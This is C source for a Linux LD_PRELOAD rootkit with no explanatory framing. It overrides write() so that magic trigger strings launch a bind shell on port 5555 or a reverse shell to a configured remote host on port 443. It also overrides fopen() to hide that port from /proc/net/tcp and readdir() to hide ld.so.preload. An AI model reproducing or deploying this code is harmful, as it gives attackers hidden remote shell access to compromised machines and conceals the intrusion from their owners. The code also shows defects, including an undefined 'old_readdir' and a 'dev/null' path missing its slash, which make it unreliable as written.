#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <dlfcn.h>
#include <dirent.h>
#include <arpa/inet.h>
#define BIND_KEY "CUBE_IS_REALLY_COOL_BIND"
#define REVERSE_KEY "CUBE_IS_REALLY_COOL_REVERSE"
#define REMOTE_HOST "127.0.0.1"
#define REMOTE_PORT 443
#define LOCAL_PORT 80


int TCP_IP_BIND_SHELL(void){

    int listening_socket = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(5555);

    bind(listening_socket, (struct sockaddr *)&server_addr, sizeof(server_addr));

    listen(listening_socket, 5);

    int accepted_socket = accept(listening_socket, NULL, NULL);

    for(int i = 0; i < 3; i++){
        dup2(accepted_socket, i);
    }
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    close(listening_socket);
}

int TCP_IP_REVERSE_SHELL(void){

    const char* host = REMOTE_HOST;

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(REMOTE_PORT);
    inet_aton(host, &server_addr.sin_addr);

    struct sockaddr_in client_addr;
    client_addr.sin_family = AF_INET;
    client_addr.sin_addr.s_addr = INADDR_ANY;
    client_addr.sin_port = htons(LOCAL_PORT);


    int listening_socket = socket(AF_INET, SOCK_STREAM, 0);

    bind(listening_socket, (struct sockaddr *)&client_addr, sizeof(client_addr));

    connect(listening_socket, (struct sockaddr*)&server_addr, sizeof(server_addr));
    
    for(int i = 0; i < 3; i++){
        dup2(listening_socket, i);
    }
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
    close(listening_socket);
}

ssize_t write(int fildes, const void *buf, size_t nbytes)
{
	ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

	ssize_t result;

	new_write = dlsym(RTLD_NEXT, "write");

    char* malConnectBind = strstr(buf, BIND_KEY);
    char* malConnectReverse = strstr(buf, REVERSE_KEY);

    if(malConnectBind != NULL){
        fildes = open("dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        TCP_IP_BIND_SHELL();
    }
    else if(malConnectReverse != NULL){
        fildes = open("dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        TCP_IP_REVERSE_SHELL();
    }
    else result = new_write(fildes, buf, nbytes);
	
	return result;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE* fopen(const char *pathname, const char *mode){

    orig_fopen = dlsym(RTLD_NEXT, "fopen");
    
    char* procTCPptr = strstr(pathname, "/proc/net/tcp");
    
    FILE* fp;

    if(procTCPptr != NULL){
        char* networkLine[400];
        FILE *ret = tmpfile();
        fp = orig_fopen(pathname, mode);
        while(fgets(networkLine, sizeof(networkLine), fp)){
            char* malPort = strstr(networkLine, "5555");
            if(malPort == NULL){
                fputs(networkLine, ret);
            }
            else continue;
        }
        return ret;
    }

    fp = orig_fopen(pathname, mode);
    return fp;
}

struct dirent*(*orig_readdir)(DIR *directory);
struct dirent *readdir(DIR *dirp){

    orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *directory;

    while(directory = old_readdir(dirp)){
        if(strstr(directory -> d_name, "ld.so.preload") == 0) break;
    }

    return  directory;

}
